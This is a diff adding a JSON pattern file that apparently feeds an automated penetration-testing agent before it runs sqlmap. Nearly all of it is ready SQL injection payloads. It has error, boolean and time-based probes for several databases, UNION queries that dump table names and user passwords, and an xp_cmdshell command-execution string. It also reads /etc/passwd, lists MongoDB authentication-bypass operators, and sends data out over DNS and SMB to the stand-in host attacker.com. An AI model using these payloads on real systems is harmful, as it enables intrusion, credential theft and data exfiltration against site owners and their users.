@@ -1,0 +1,72 @@
+{
+  "type": "sqli_patterns",
+  "description": "SQL injection detection and exploitation patterns. Agent uses these to identify injection points and confirm before running sqlmap.",
+  "detection": {
+    "error_based": {
+      "description": "Trigger database errors to confirm injection",
+      "payloads": ["'", "''", "';--", "' OR '1'='1", "1'", "1\"", "\\"],
+      "confirm_pattern": "original_value + ' returns error, original_value + '' returns normal = likely injectable"
+    },
+    "boolean_based": {
+      "description": "Detect injection via boolean logic differences",
+      "true_payload": "' OR '1'='1",
+      "false_payload": "' OR '1'='2",
+      "confirm_pattern": "True payload returns different response than false payload"
+    },
+    "time_based": {
+      "description": "Detect blind injection via time delay",
+      "mysql": "' AND SLEEP(5)--",
+      "mssql": "'; WAITFOR DELAY '0:0:5'--",
+      "postgresql": "' AND 1=CAST(pg_sleep(5) AS integer)--",
+      "oracle": "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),5)--",
+      "confirm_pattern": "Response takes 5+ seconds = injectable"
+    }
+  },
+  "error_messages": {
+    "mysql": ["You have an error in your SQL syntax", "mysql_fetch_array()", "MySQL server version"],
+    "mssql": ["Unclosed quotation mark", "Incorrect syntax near", "Microsoft OLE DB Provider"],
+    "postgresql": ["ERROR: unterminated quoted string", "PSQLException", "pg_query()"],
+    "oracle": ["ORA-00907", "ORA-00933", "ORA-01756"],
+    "sqlite": ["SQLite3::query()", "near \"syntax error\"", "sqlite_"],
+    "generic": ["ODBC SQL Server Driver", "Warning: mysql", "Syntax error in query expression"]
+  },
+  "exploitation": {
+    "union_based": {
+      "mysql": {
+        "version":    "' UNION SELECT NULL,@@version,NULL--",
+        "tables":     "' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--",
+        "columns":    "' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--",
+        "dump":       "' UNION SELECT NULL,username,password FROM users--"
+      },
+      "mssql": {
+        "version":    "' UNION SELECT NULL,@@version,NULL--",
+        "tables":     "' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--",
+        "xp_cmdshell":"'; EXEC xp_cmdshell('whoami')--"
+      },
+      "postgresql": {
+        "version":    "' UNION SELECT NULL,version(),NULL--",
+        "tables":     "' UNION SELECT NULL,tablename,NULL FROM pg_tables WHERE schemaname='public'--"
+      }
+    },
+    "order_by_count": "Increment ORDER BY number until error to determine column count: ORDER BY 1, ORDER BY 2, ...",
+    "null_technique": "Use NULL values in UNION: NULL is compatible with any column type",
+    "out_of_band": {
+      "mysql":  "' UNION SELECT LOAD_FILE('/etc/passwd')--",
+      "mssql":  "'; EXEC master..xp_dirtree '//attacker.com/a'--",
+      "description": "Requires outbound network from DB server"
+    }
+  },
+  "nosql_patterns": {
+    "mongodb": {
+      "bypass_auth": "username: {\"$gt\": \"\"}, password: {\"$gt\": \"\"}",
+      "json_injection": "{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}",
+      "operator_injection": "username[$ne]=invalid&password[$ne]=invalid"
+    },
+    "description": "NoSQL injection often bypasses authentication by using operators instead of strings"
+  },
+  "oob_exfil": {
+    "description": "Out-of-band data exfiltration when response-based techniques fail",
+    "mysql":      "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',version(),'.attacker.com\\\\a'))--",
+    "mssql":      "'; EXEC master..xp_dirtree '\\\\'+@@version+'.attacker.com\\a'--"
+  }
+}
